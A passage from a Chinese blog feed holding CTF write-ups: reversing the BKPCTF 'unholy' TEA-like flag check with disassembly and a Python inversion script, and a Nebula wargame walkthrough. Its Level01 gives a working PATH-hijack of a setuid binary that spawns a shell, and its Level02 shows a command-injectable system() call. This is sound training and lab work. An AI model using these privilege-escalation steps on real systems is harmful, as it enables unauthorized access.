ctf5</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>这次的0CTF我们投机取巧派被学院派教做人。。然后发现自己，不会js，不会php。不会python。web题看了两题，都差一点出来。。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[unholy Writeup]]></title>
    <link href="http://0x48.pw/2016/03/07/0x11/"/>
    <id>http://0x48.pw/2016/03/07/0x11/</id>
    <published>2016-03-07T02:16:46.000Z</published>
    <updated>2016-03-28T10:19:25.414Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>这周末和小伙伴们一起打BKPCTF，我一个web狗，竟然撸逆向停不下来。。。撸了两个晚上。。。终于撸出来了。。</p>
</blockquote>
<a id="more"></a>
<p>unholy这题说是ruby+python，其实我觉得主要还是逆C。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">main.rb</span><br><span class="line">require_relative 'unholy'</span><br><span class="line">include UnHoly</span><br><span class="line">python_hi</span><br><span class="line">puts ruby_hi</span><br><span class="line">puts "Programming Skills: PRIMARILY RUBY AND PYTHON BUT I CAN <span class="operator"><span class="keyword">USE</span> <span class="keyword">ANY</span> TYPE <span class="keyword">OF</span> GEM <span class="keyword">TO</span> CONTROL <span class="keyword">ANY</span> TYPE <span class="keyword">OF</span> SNAKE<span class="string">"</span><br><span class="line">puts "</span>give me your flag<span class="string">"</span><br><span class="line">flag = gets.chomp!</span><br><span class="line">arr = flag.unpack("</span>V*<span class="string">")</span><br><span class="line">is_key_correct? arr</span></span></span><br></pre></td></tr></table></figure></p>
<p>一个很简单的ruby脚本，不过这里需要装libruby2.1才能跑。。。（自己装装就知道了，国内装libruby2.1有点坑)<br>然后重点在于unholy.so，丢到ida中逆向看看，有几个重要的地方，主要是<code>method_check_key</code>函数，也就是ruby里的is_key_correct?<br>这个函数规定了只能传入长度为９的int型数组<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">13E8h</span>+matrix+<span class="number">24h</span>], <span class="number">61735320h</span>　；　matrix[<span class="number">9</span>] = <span class="number">0x61735320</span></span><br></pre></td></tr></table></figure></p>
<p>形成长度为10的数组，然后经过如下算法<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">loc_BFC:</span>                                <span class="comment">; CODE XREF: method_check_key+112j</span></span><br><span class="line"><span class="string">.text</span>:0000000000000BFC block = <span class="literal">rdx</span>                             <span class="comment">; uint32_t[2]</span></span><br><span class="line"><span class="string">.text</span>:0000000000000BFC                 <span class="keyword">mov</span>     <span class="literal">rax</span>, [<span class="literal">rbx</span>+<span class="literal">rdi</span>]</span><br><span class="line"><span class="string">.text</span>:0000000000000C00 block = <span class="literal">rax</span>                             <span class="comment">; uint32_t[2]</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C00                 <span class="keyword">xor</span>     <span class="literal">r8d</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C03                 <span class="keyword">mov</span>     <span class="number">edx</span>, <span class="number">eax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C05                 <span class="keyword">shr</span>     block, <span class="number">20h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C09</span><br><span class="line"><span class="label">loc_C09:</span>                                <span class="comment">; CODE XREF: method_check_key+FDj</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C09                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C0C                 <span class="keyword">mov</span>     <span class="literal">esi</span>, <span class="number">eax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C0E                 <span class="keyword">and</span>     <span class="number">ecx</span>, <span class="number">3</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C11                 <span class="keyword">shr</span>     <span class="literal">esi</span>, <span class="number">5</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C14                 <span class="keyword">mov</span>     <span class="literal">r9d</span>, [<span class="literal">rsp</span>+<span class="literal">rcx</span>*<span class="number">4</span>+<span class="number">13E8h</span>+key]</span><br><span class="line"><span class="string">.text</span>:0000000000000C19                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="number">eax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C1B                 <span class="keyword">shl</span>     <span class="number">ecx</span>, <span class="number">4</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C1E                 <span class="keyword">xor</span>     <span class="literal">esi</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C20                 <span class="keyword">lea</span>     <span class="number">ecx</span>, [<span class="literal">rsi</span>+<span class="literal">rax</span>]</span><br><span class="line"><span class="string">.text</span>:0000000000000C23                 <span class="keyword">add</span>     <span class="literal">r9d</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C26                 <span class="keyword">sub</span>     <span class="literal">r8d</span>, <span class="number">61C88647h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C2D                 <span class="keyword">xor</span>     <span class="number">ecx</span>, <span class="literal">r9d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C30                 <span class="keyword">add</span>     <span class="number">edx</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C32                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C35                 <span class="keyword">shr</span>     <span class="number">ecx</span>, <span class="number">0Bh</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C38                 <span class="keyword">mov</span>     <span class="literal">esi</span>, <span class="number">edx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C3A                 <span class="keyword">and</span>     <span class="number">ecx</span>, <span class="number">3</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C3D                 <span class="keyword">shr</span>     <span class="literal">esi</span>, <span class="number">5</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C40                 <span class="keyword">mov</span>     <span class="literal">r9d</span>, [<span class="literal">rsp</span>+<span class="literal">rcx</span>*<span class="number">4</span>+<span class="number">13E8h</span>+key]</span><br><span class="line"><span class="string">.text</span>:0000000000000C45                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="number">edx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C47                 <span class="keyword">shl</span>     <span class="number">ecx</span>, <span class="number">4</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C4A                 <span class="keyword">xor</span>     <span class="literal">esi</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C4C                 <span class="keyword">lea</span>     <span class="number">ecx</span>, [<span class="literal">rsi</span>+<span class="literal">rdx</span>]</span><br><span class="line"><span class="string">.text</span>:0000000000000C4F                 <span class="keyword">add</span>     <span class="literal">r9d</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C52                 <span class="keyword">xor</span>     <span class="number">ecx</span>, <span class="literal">r9d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C55                 <span class="keyword">add</span>     <span class="number">eax</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C57                 <span class="keyword">cmp</span>     <span class="literal">r8d</span>, <span class="number">0C6EF3720h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C5E                 <span class="keyword">jnz</span>     short loc_C09</span><br><span class="line"><span class="string">.text</span>:0000000000000C60                 <span class="keyword">shl</span>     <span class="literal">rax</span>, <span class="number">20h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C64 block = <span class="literal">rdx</span>                             <span class="comment">; uint32_t[2]</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C64                 <span class="keyword">or</span>      <span class="literal">rax</span>, block</span><br><span class="line"><span class="string">.text</span>:0000000000000C67                 <span class="keyword">mov</span>     [<span class="literal">rbx</span>+<span class="literal">rdi</span>], <span class="literal">rax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C6B                 <span class="keyword">add</span>     <span class="literal">rdi</span>, <span class="number">8</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C6F                 <span class="keyword">cmp</span>     <span class="literal">rdi</span>, <span class="number">28h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C73                 <span class="keyword">jnz</span>     short loc_BFC</span><br></pre></td></tr></table></figure></p>
<p>这个算法转换用python写是：<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i in xrange<span class="params">(<span class="number">0</span>, <span class="number">10</span>, <span class="number">2</span>)</span>:</span><br><span class="line">	flag = <span class="number">0</span></span><br><span class="line">	while flag <span class="built_in">!</span>= <span class="number">0</span>xC6EF3720:</span><br><span class="line">		arry[i] += <span class="params">(flag + key[<span class="params">(flag)</span>&amp;<span class="number">3</span>])</span>^<span class="params">(arry[i+<span class="number">1</span>] * <span class="number">16</span> ^ <span class="params">(arry[i+<span class="number">1</span>] / <span class="number">32</span>)</span> + arry[i+<span class="number">1</span>])</span></span><br><span class="line">		flag = ctypes.c_uint32<span class="params">(flag - <span class="number">0</span>x61C88647)</span>.value</span><br><span class="line">		arry[i+<span class="number">1</span>] += <span class="params">(flag + key[<span class="params">(flag / <span class="number">2048</span>)</span>&amp;<span class="number">3</span>])</span>^<span class="params">(<span class="params">(<span class="params">(arry[i] * <span class="number">16</span>)</span> ^ <span class="params">(arry[i] / <span class="number">32</span>)</span>)</span> + arry[i])</span>;</span><br></pre></td></tr></table></figure></p>
<p>最后输出的数组<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmp</span>     [<span class="literal">rsp</span>+<span class="number">13E8h</span>+matrix+<span class="number">24h</span>], <span class="number">4DE3F9FDh</span> <span class="comment">;           matrix[9] == 0x4DE3F9FD</span></span><br></pre></td></tr></table></figure></p>
<p>如果第十个数的值为0x4DE3F9FD, 则把前9个值传入下面的python脚本<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line">X=[</span><br><span class="line">	[%<span class="keyword">d</span>,%<span class="keyword">d</span>,%<span class="keyword">d</span>],</span><br><span class="line">	[%<span class="keyword">d</span>,%<span class="keyword">d</span>,%<span class="keyword">d</span>],</span><br><span class="line">	[%<span class="keyword">d</span>,%<span class="keyword">d</span>,%<span class="keyword">d</span>] </span><br><span class="line">]</span><br><span class="line">Y = [</span><br><span class="line">	[383212,38297,8201833],</span><br><span class="line">	[382494 ,348234985,3492834886],</span><br><span class="line">	[3842947 ,984328,38423942839]</span><br><span class="line">]</span><br><span class="line"><span class="keyword">n</span>=[5034563854941868,252734795015555591,55088063485350767967,</span><br><span class="line">-2770438152229037,142904135684288795,-33469734302639376803,</span><br><span class="line">-3633507310795117,195138776204250759,-34639402662163370450]</span><br><span class="line">y=[</span><br><span class="line">	[0,0,0],</span><br><span class="line">	[0,0,0],</span><br><span class="line">	[0,0,0]</span><br><span class="line">]</span><br><span class="line">A=[0,0,0,0,0,0,0,0,0]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(3):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(3):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> <span class="keyword">range</span>(3):</span><br><span class="line">			y[i][j]+=X[i][k]*Y[k][j]</span><br><span class="line">c=0</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> y:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> r:</span><br><span class="line">		<span class="keyword">if</span> x!=<span class="keyword">n</span>[c]:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"dang..."</span></span><br><span class="line">			sys.<span class="keyword">exit</span>(47)</span><br><span class="line">		c=c+1</span><br><span class="line"><span class="keyword">print</span> <span class="string">":)"</span></span><br></pre></td></tr></table></figure></p>
<p>然后算出X<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X=[</span><br><span class="line">	[-<span class="number">1304886577</span>,<span class="number">722035088</span>,<span class="number">1368334760</span>],</span><br><span class="line">	[<span class="number">1473172750,41</span><span class="number">2774077</span>,-<span class="number">908901225</span>],</span><br><span class="line">	[-<span class="number">490967005</span>,<span class="number">563111828</span>,-<span class="number">952589187</span>] </span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<p>所以上面那个算法的输出要为:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">matrix = [-<span class="number">1304886577</span>,<span class="number">722035088</span>,<span class="number">1368334760</span>,<span class="number">1473172750,41</span><span class="number">2774077</span>,-<span class="number">908901225</span>,-<span class="number">490967005</span>,<span class="number">563111828</span>,-<span class="number">952589187</span>, <span class="number">1306786301</span>]</span><br></pre></td></tr></table></figure></p>
<p>然后逆向算法最后得出脚本<br><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># reserve.py</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">arry =<span class="comment">[-1304886577,722035088,1368334760, 1473172750,412774077,-908901225, -490967005,563111828,-952589187, 1306786301]</span></span><br><span class="line">key = <span class="comment">[1952540791, 1768908659, 1852794734, 1701995880]</span></span><br><span class="line">for x in range(len(arry)):</span><br><span class="line">	arry<span class="comment">[x]</span> = ctypes.c_uint32(arry<span class="comment">[x]</span>).value</span><br><span class="line"></span><br><span class="line">for i in xrange(0, 10, 2):</span><br><span class="line">	flag = 0xC6EF3720</span><br><span class="line">	while flag != 0:</span><br><span class="line">		v12 = flag + key<span class="comment">[(flag / 2048)&amp;3]</span></span><br><span class="line">		ecx4 = ((arry<span class="comment">[i]</span> * 16) ^ (arry<span class="comment">[i]</span> / 32)) + arry<span class="comment">[i]</span></span><br><span class="line">		x = v12^ecx4</span><br><span class="line">		arry<span class="comment">[i+1]</span> = arry<span class="comment">[i+1]</span> - x</span><br><span class="line">		arry<span class="comment">[i+1]</span> = ctypes.c_uint32(arry<span class="comment">[i+1]</span>).value</span><br><span class="line"></span><br><span class="line">		flag = ctypes.c_uint32(flag + 0x61C88647).value</span><br><span class="line"></span><br><span class="line">		v11 = flag + key<span class="comment">[flag&amp;3]</span></span><br><span class="line">		ecx2 = ((arry<span class="comment">[i+1]</span> * 16) ^ (arry<span class="comment">[i+1]</span> / 32)) + arry<span class="comment">[i+1]</span></span><br><span class="line">		y = v11^ecx2</span><br><span class="line">		arry<span class="comment">[i]</span> = arry<span class="comment">[i]</span> - y</span><br><span class="line">		arry<span class="comment">[i]</span> = ctypes.c_uint32(arry<span class="comment">[i]</span>).value</span><br><span class="line"></span><br><span class="line">for x in range(len(arry)):</span><br><span class="line">	arry<span class="comment">[x]</span> = ctypes.c_int32(arry<span class="comment">[x]</span>).value</span><br><span class="line">print arry</span><br></pre></td></tr></table></figure></p>
<p>这里有几个重要的地方，坑了我好久，一个是优先级的问题，比如<code>x ^ y + z</code>这个其实是 <code>x ^ (y + z)</code><br>还有一个，就是python不需要定义变量类型，而matrix十个值为uint_32, 所以python 就要通过ctypes进行转换，还有flag也需要进行转换.</p>
<p>最后得出<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1129335618</span>, <span class="number">1752909396</span>, <span class="number">544042349</span>, <span class="number">2036889439</span>, <span class="number">1684628512</span>, <span class="number">1696622880</span>, <span class="number">544105846</span>, <span class="number">1948282724</span>, <span class="number">2104715624</span>, <span class="number">1634947872</span>]</span><br></pre></td></tr></table></figure></p>
<p>这个数组就是flag<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x in arry:</span><br><span class="line">	tem_hex = hex<span class="params">(x)</span>[<span class="number">2</span>:]</span><br><span class="line">	tem_list = []</span><br><span class="line">	<span class="keyword">for</span> y in xrange<span class="params">(<span class="number">0</span>, len<span class="params">(tem_hex)</span>, <span class="number">2</span>)</span>:</span><br><span class="line">		tem_list.append<span class="params">(chr<span class="params">(int<span class="params">(tem_hex[y:y+<span class="number">2</span>], <span class="number">16</span>)</span>)</span>)</span></span><br><span class="line">	tem_list.reverse<span class="params">()</span></span><br><span class="line">	flag += <span class="string">""</span>.join<span class="params">(tem_list)</span></span><br><span class="line"></span><br><span class="line">print flag</span><br><span class="line"><span class="built_in">#</span> BKPCTF&#123;hmmm _why did i even do this&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>这周末和小伙伴们一起打BKPCTF，我一个web狗，竟然撸逆向停不下来。。。撸了两个晚上。。。终于撸出来了。。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="RE" scheme="http://0x48.pw/tags/RE/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Nebula Writeup]]></title>
    <link href="http://0x48.pw/2016/02/14/0x0F/"/>
    <id>http://0x48.pw/2016/02/14/0x0F/</id>
    <published>2016-02-14T02:16:46.000Z</published>
    <updated>2016-03-28T10:20:07.726Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>这份writeup可能水分很大，因为第一次玩这类的题目，所以一边看别人的writeup一边玩才玩的出来，不过还会有自己的总结。</p>
</blockquote>
<a id="more"></a>
<h1 id="附">附</h1><p>这游戏一开始我是直接在虚拟机中玩，后面发现自己傻的可以，虚拟机中各种不方便，不能粘贴复制之类，没有鼠标etc。</p>
<p>后面发现，特么我只要设置下虚拟机的网络，就可以用本机shell，ssh连上去啊！</p>
<h1 id="Level00">Level00</h1><p>第0题就是在告诉我们这系列的题目要怎么玩了，如何才算做出来。</p>
<p>其实就是分为两类用户，一个是levelxx和flagxx，xx就是题号，目的就是在levelxx用户的情况下，通过某些方法进入flagxx用户，然后执行getflag. 按目前的情况看，flagxx就是含漏洞的可执行文件。之后还有一些题是要求获取token，而token就是该题flag用户的密码。</p>
<p>第0题没啥技术性，就是用来告诉我们上面这些东西，<code>flag00</code> 的路径位 <code>/bin/.../flag00</code>, 直接执行就好:</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">level0<span class="number">0</span><span class="variable">@nebula</span><span class="symbol">:/bin/</span>...<span class="variable">$ </span>./flag0<span class="number">0</span></span><br><span class="line"><span class="constant">Congrats,</span> now run getflag to get your flag!</span><br><span class="line"></span><br><span class="line">flag0<span class="number">0</span><span class="variable">@nebula</span><span class="symbol">:/bin/</span>...<span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h1 id="Level01">Level01</h1><p>第一题就感觉学到很多了，这题给了程序的源码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag01.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">gid_t</span> gid;</span><br><span class="line">    <span class="keyword">uid_t</span> uid;</span><br><span class="line"></span><br><span class="line">    gid = getegid();</span><br><span class="line">    uid = geteuid();</span><br><span class="line"></span><br><span class="line">    setresgid(gid, gid, gid);</span><br><span class="line">    setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"/usr/bin/env echo and now what?"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序位于 <code>/home/flag01/flag01</code>, 我认为该题的关键点在于文件的s权限，</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ chmod <span class="number">4750</span> fla<span class="keyword">g01</span></span><br><span class="line">$ ll</span><br><span class="line">-rwsr-x--- fla<span class="keyword">g01</span> level<span class="number">01</span>       fla<span class="keyword">g01</span></span><br></pre></td></tr></table></figure>
<p>uid, gid现在还不是了解的很清楚，以后再研究。</p>
<p>在没有设置s权限的情况下，运行flag01的uid和gid都为运行该程序用户的id，(可在/etc/passwd中查看)，但当设置了s权限之后，uid则变为该文件所属用户的uid，也就是说，任意用户(有权限)运行该文件，uid都为flag01的uid。</p>
<p>这有啥意义呢？ 该游戏的目的是使用levelxx用户通过flagxx程序get flagxx用户shell，运行getflag，该程序最后使用了system函数运行系统命令，因为设置了s权限，所以是以该文件所有者的身份运行命令，所以有两个思路，一个是直接运行getflag，另一个是运行<code>/bin/bash</code> get flag01用户的shell，这里我们用第二种方法。</p>
<p><code>$ /usr/bin/env echo</code> 是从左往右搜索 $PATH环境变量中的路径，寻找echo命令，则我们可以在环境变量的最左边添加一个路径，里面有一个我们自己写的echo命令:</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">level01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span><span class="constant">PATH=</span>/<span class="symbol">tmp:</span><span class="variable">$PATH</span></span><br><span class="line">level01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span>vim /tmp/echo</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/bin/bash</span><br><span class="line"><span class="symbol">:wq</span></span><br><span class="line">level01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x /tmp/echo</span><br><span class="line">level01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span>cd /home/flag01</span><br><span class="line">level01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span>./flag01</span><br><span class="line">flag01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h1 id="Level02">Level02</h1><p>这题一样，源码审计：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag02.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *buffer;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">gid_t</span> gid;</span><br><span class="line">    <span class="keyword">uid_t</span> uid;</span><br><span class="line"></span><br><span class="line">    gid = getegid();</span><br><span class="line">    uid = geteuid();</span><br><span class="line"></span><br><span class="line">    setresgid(gid, gid, gid);</span><br><span class="line">    setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">    buffer = NULL;</span><br><span class="line">    </span><br><span class="line">    asprintf($buffer, <span class="string">"/bin/echo %s is cool"</span>, getenv(<span class="string">"USER"</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"about to call system(\"%s\")\n"</span>, buffer);</span><br><span class="line">    </span><br><span class="line">    system(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后运行该程序试试<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">level02<span class="variable">@nebula</span><span class="symbol">:/home/flag02</span><span class="variable">$ </span>./flag02</span><br><span class="line">about to call system(<span class="string">"/bin/echo level02 is cool"</span>)</span><br><span class="line">level02 is cool</span><br></pre></td></tr></table></figure></p>
